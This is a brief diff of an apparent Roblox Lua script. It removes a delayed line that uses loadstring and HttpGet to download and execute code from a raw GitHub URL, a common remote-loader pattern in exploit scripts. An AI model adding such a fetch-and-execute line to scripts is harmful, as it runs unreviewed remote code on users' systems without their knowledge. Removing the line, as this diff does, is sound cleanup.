@@ -20,9 +20,3 @@ end
 
 -- Listen for new characters being added
 LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
-
--- Wait 2 seconds before executing loadstring
-task.wait(2) -- Wait for 2 seconds before loading the next part
-
--- Load and execute the script from the URL
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mamelokq/auto-players/refs/heads/main/auto"))()
